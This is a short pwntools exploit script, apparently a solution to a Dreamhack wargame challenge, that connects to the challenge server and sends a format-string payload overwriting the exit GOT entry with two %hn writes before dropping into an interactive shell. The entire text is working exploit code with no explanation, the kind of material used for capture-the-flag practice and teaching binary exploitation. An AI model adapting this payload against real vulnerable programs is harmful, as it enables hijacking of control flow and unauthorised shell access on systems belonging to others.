from pwn import *

p = remote("host1.dreamhack.games", 15758)
exit = 0x0804a024

pay = p32(exit+2)
pay += p32(exit)
pay += "%2044c%1$hn%32261c%2$hn"

p.send(pay)
p.interactive()